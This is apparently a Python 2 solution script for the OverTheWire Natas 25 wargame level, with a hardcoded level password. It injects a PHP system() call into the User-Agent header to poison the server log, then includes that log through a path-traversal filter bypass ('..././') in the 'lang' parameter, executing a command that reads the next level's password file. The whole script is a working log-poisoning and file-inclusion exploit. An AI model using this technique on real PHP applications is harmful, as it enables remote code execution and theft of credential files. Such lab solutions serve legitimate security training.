#! /usr/bin/env python

import requests
import re

usn = 'natas25'
url = 'http://%s.natas.labs.overthewire.org/' % usn
passwd = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
login = (usn, passwd)
headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');  ?>"}

request = requests.Session()
def get_source_code():
  connection = request.get(url, auth=login, allow_redirects = False)
  pageContent = connection.text
  print pageContent;


def solve_lab():
  connectionGet = request.get(url, auth=login)
  sessId = request.cookies['PHPSESSID']
  #print request.cookies['PHPSESSID'];
  connectionPost = request.post(url, headers = headers, data = {"lang":"..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + sessId + ".log" }, auth = login)
  pageContent = connectionPost.text 
  print pageContent